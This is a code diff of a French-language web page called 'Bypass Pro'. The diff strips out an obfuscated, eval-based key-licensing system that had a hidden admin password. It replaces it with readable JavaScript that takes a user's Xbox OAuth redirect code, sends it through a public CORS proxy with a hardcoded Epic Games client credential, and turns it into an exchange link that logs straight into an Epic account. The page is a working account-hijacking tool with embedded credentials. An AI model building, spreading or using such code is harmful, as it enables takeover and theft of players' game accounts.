@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bypass Premium | Private Vault</title>
+    <title>Bypass Pro | Private Access</title>
     <link rel="icon" type="image/webp" href="https://ftnaccounts.mysellauth.com/storage/images/683973.webp">
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
         :root { --neon: #00ff9d; --neon-drop: rgba(0, 255, 157, 0.3); }
-        body { background-color: #020202; font-family: 'Inter', sans-serif; color: white; overflow: hidden; margin: 0; }
+        body { background-color: #020202; font-family: 'Inter', sans-serif; color: white; overflow-x: hidden; margin: 0; }
         .bg-grid { position: fixed; inset: 0; background-image: linear-gradient(to right, rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(to bottom, rgba(255,255,255,0.02) 1px, transparent 1px); background-size: 40px 40px; z-index: -1; }
         .bg-glow { position: fixed; width: 100vw; height: 100vh; background: radial-gradient(circle at 50% 50%, #0a1a14 0%, #020202 100%); z-index: -2; }
         .glass-card { background: rgba(10, 10, 15, 0.85); backdrop-filter: blur(20px); border: 1px solid rgba(0, 255, 157, 0.1); box-shadow: 0 0 50px rgba(0, 0, 0, 0.9); }
@@ -20,27 +20,13 @@
         .btn-premium:hover { transform: translateY(-2px); box-shadow: 0 5px 25px var(--neon-drop); cursor: pointer; }
         .btn-microsoft { background: rgba(0, 0, 0, 0.75); border: 1px solid rgba(255, 255, 255, 0.1); transition: all 0.3s ease; }
         .btn-microsoft:hover { background: rgba(255, 255, 255, 0.05); border-color: #107c10; box-shadow: 0 0 20px rgba(16, 124, 16, 0.3); }
-        #keyOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 100; display: flex; align-items: center; justify-content: center; }
-        .admin-trigger { position: absolute; top: 15px; left: 15px; width: 40px; height: 40px; opacity: 0.05; cursor: default; z-index: 101; }
-        .admin-trigger:hover { opacity: 0.5; color: var(--neon); }
+        .scrollbar-hide::-webkit-scrollbar { display: none; }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen">
     <div class="bg-glow"></div><div class="bg-grid"></div><div class="scanline"></div>
-    
-    <button onclick="adminAccess()" class="admin-trigger text-[10px] font-bold">ADM</button>
 
-    <div id="keyOverlay">
-        <div class="glass-card max-w-sm w-full p-10 rounded-[40px] text-center">
-            <h2 class="neon-text text-2xl mb-2 font-black uppercase">Accès Privé</h2>
-            <p class="text-[9px] text-gray-500 mb-8 tracking-widest uppercase">Système de sécurité actif</p>
-            <input type="text" id="keyInput" placeholder="ENTREZ VOTRE CLÉ" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl text-center text-white mb-6 outline-none focus:border-[#00ff9d] transition-all font-mono">
-            <button onclick="activateKey()" class="w-full py-4 btn-premium rounded-2xl uppercase tracking-[2px]">Vérifier la Clé</button>
-            <p id="errorMessage" class="text-red-500 text-[10px] mt-4 hidden font-bold uppercase"></p>
-        </div>
-    </div>
-
-    <div id="mainUI" class="w-full max-w-5xl p-6 opacity-0 scale-95 transition-all duration-1000 pointer-events-none grid grid-cols-1 md:grid-cols-2 gap-8 mx-auto">
+    <div id="mainUI" class="w-full max-w-5xl p-6 transition-all duration-1000 grid grid-cols-1 md:grid-cols-2 gap-8 mx-auto">
         
         <div class="glass-card rounded-[40px] p-10 flex flex-col justify-between border-white/5">
             <div>
@@ -49,7 +35,7 @@
                         <h1 class="text-3xl font-black italic uppercase">Bypass <span class="text-[#00ff9d]">Pro</span></h1>
                         <p class="text-[9px] text-gray-500 font-bold tracking-[4px] mt-1">SÉCURITÉ ÉLEVÉE</p>
                     </div>
-                    <div id="timerDisplay" class="text-[12px] text-yellow-500 font-mono font-bold bg-yellow-500/10 px-4 py-2 rounded-xl border border-yellow-500/20">24:00:00</div>
+                    <div class="text-[12px] text-[#00ff9d] font-mono font-bold bg-[#00ff9d]/10 px-4 py-2 rounded-xl border border-[#00ff9d]/20">ACCÈS ILLIMITÉ</div>
                 </div>
 
                 <div class="space-y-5">
@@ -104,7 +90,63 @@
     </div>
 
     <script>
-        var _0x2f=["\x46\x61\x62\x69\x65\x6E\x36\x32\x73","\x62\x79\x70\x61\x73\x73\x5F\x76\x34\x5F\x6D\x61\x73\x74\x65\x72","\x62\x79\x70\x61\x73\x73\x5F\x76\x34\x5F\x75\x73\x65\x64","\x62\x79\x70\x61\x73\x73\x5F\x76\x34\x5F\x73\x65\x73\x73\x69\x6F\x6E","\x63\x6F\x64\x65\x3D","\x64\x69\x73\x70\x6C\x61\x79\x4E\x61\x6D\x65","\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E"];(function(){const _0x1=btoa(`function _0x7a(){const c="ABCDEFGHJKLMNPQRSTUVWXYZ23456789";const p=()=>Array.from({length:4},()=>c[Math.floor(Math.random()*c.length)]).join('');return "KEY-"+p()+"-"+p()}let mk=JSON.parse(localStorage.getItem(_0x2f[1]));if(!mk){mk=Array.from({length:100},_0x7a);localStorage.setItem(_0x2f[1],JSON.stringify(mk))}let uk=JSON.parse(localStorage.getItem(_0x2f[2]))||[];window.adminAccess=()=>{if(prompt("PASSWORD:")===_0x2f[0]){const f=mk.filter(k=>!uk.includes(k));navigator.clipboard.writeText(f.join('\\n'));alert(f.length+" clés copiées dans le presse-papier!")}};window.activateKey=()=>{const v=document.getElementById('keyInput').value.trim().toUpperCase();if(mk.includes(v)&&!uk.includes(v)){uk.push(v);localStorage.setItem(_0x2f[2],JSON.stringify(uk));const e=new Date().getTime()+86400000;localStorage.setItem(_0x2f[3],e);uui(e)}else{const er=document.getElementById('errorMessage');er.innerText="CLÉ INVALIDE OU EXPIRÉE";er.classList.remove('hidden');setTimeout(()=>er.classList.add('hidden'),3000)}};function uui(e){document.getElementById('keyOverlay').style.opacity='0';setTimeout(()=>{document.getElementById('keyOverlay').style.display='none';const m=document.getElementById('mainUI');m.classList.remove('opacity-0','scale-95','pointer-events-none')},500);st(e)}function st(e){setInterval(()=>{const d=e-new Date().getTime();if(d<=0)location.reload();const h=Math.floor(d/3600000).toString().padStart(2,'0'),m=Math.floor((d%3600000)/60000).toString().padStart(2,'0'),s=Math.floor((d%60000)/1000).toString().padStart(2,'0');document.getElementById('timerDisplay').innerText=h+":"+m+":"+s},1000)}const px="https://cors-anywhere.herokuapp.com/",au="Basic OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3";function lg(t,er=false){const d=document.createElement('div');d.style.color=er?"#ff5555":"#00ff9d";d.innerHTML="<span>></span> "+t;const c=document.getElementById('console');c.appendChild(d);c.scrollTop=c.scrollHeight}document.getElementById('startBypass').onclick=async()=>{const u=document.getElementById('oauthUrl').value;if(!u.includes(_0x2f[4]))return lg("ERREUR: URL INVALIDE",true);lg("Lancement du bypass...");const c=new URLSearchParams(new URL(u).search).get('code');try{lg("Authentification OAuth...");const r1=await fetch(px+'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','Authorization':au,'X-Requested-With':'XMLHttpRequest'},body:new URLSearchParams({'grant_type':'external_auth','external_auth_type':'xbl','external_auth_token':c})});const d1=await r1.json();if(d1[_0x2f[5]]){lg("Compte trouvé: "+d1[_0x2f[5]]);const r2=await fetch(px+'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange',{headers:{'Authorization':"Bearer "+d1[_0x2f[6]],'X-Requested-With':'XMLHttpRequest'}});const d2=await r2.json();lg("Injection terminée.");document.getElementById('resPseudo').innerText=d1[_0x2f[5]];document.getElementById('logResult').classList.remove('hidden');document.getElementById('finalUrl').href="https://www.epicgames.com/id/exchange?exchangeCode="+d2.code+"&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Faccount%2Fpersonal"}else{lg("ÉCHEC: Code expiré",true)}}catch(e){lg("ERREUR RÉSEAU",true)}};const ss=localStorage.getItem(_0x2f[3]);if(ss&&new Date().getTime()<ss)uui(ss);`);eval(atob(_0x1))})();
+        const _0x2f=["\x63\x6F\x64\x65\x3D","\x64\x69\x73\x70\x6C\x61\x79\x4E\x61\x6D\x65","\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E"];
+        const px="https://cors-anywhere.herokuapp.com/", au="Basic OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3";
+
+        function lg(t,er=false){
+            const d=document.createElement('div');
+            d.style.color=er?"#ff5555":"#00ff9d";
+            d.innerHTML="<span>></span> "+t;
+            const c=document.getElementById('console');
+            c.appendChild(d);
+            c.scrollTop=c.scrollHeight;
+        }
+
+        document.getElementById('startBypass').onclick=async()=>{
+            const u=document.getElementById('oauthUrl').value;
+            if(!u.includes(_0x2f[0])) return lg("ERREUR: URL INVALIDE",true);
+            
+            lg("Lancement du bypass...");
+            const c=new URLSearchParams(new URL(u).search).get('code');
+            
+            try {
+                lg("Authentification OAuth...");
+                const r1=await fetch(px+'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token',{
+                    method:'POST',
+                    headers:{
+                        'Content-Type':'application/x-www-form-urlencoded',
+                        'Authorization':au,
+                        'X-Requested-With':'XMLHttpRequest'
+                    },
+                    body:new URLSearchParams({
+                        'grant_type':'external_auth',
+                        'external_auth_type':'xbl',
+                        'external_auth_token':c
+                    })
+                });
+                
+                const d1=await r1.json();
+                
+                if(d1[_0x2f[1]]){
+                    lg("Compte trouvé: "+d1[_0x2f[1]]);
+                    const r2=await fetch(px+'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange',{
+                        headers:{
+                            'Authorization':"Bearer "+d1[_0x2f[2]],
+                            'X-Requested-With':'XMLHttpRequest'
+                        }
+                    });
+                    const d2=await r2.json();
+                    lg("Injection terminée.");
+                    document.getElementById('resPseudo').innerText=d1[_0x2f[1]];
+                    document.getElementById('logResult').classList.remove('hidden');
+                    document.getElementById('finalUrl').href="https://www.epicgames.com/id/exchange?exchangeCode="+d2.code+"&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Faccount%2Fpersonal";
+                } else {
+                    lg("ÉCHEC: Code expiré ou invalide",true);
+                }
+            } catch(e) {
+                lg("ERREUR RÉSEAU : Vérifiez le Proxy CORS",true);
+            }
+        };
     </script>
 </body>
 </html>
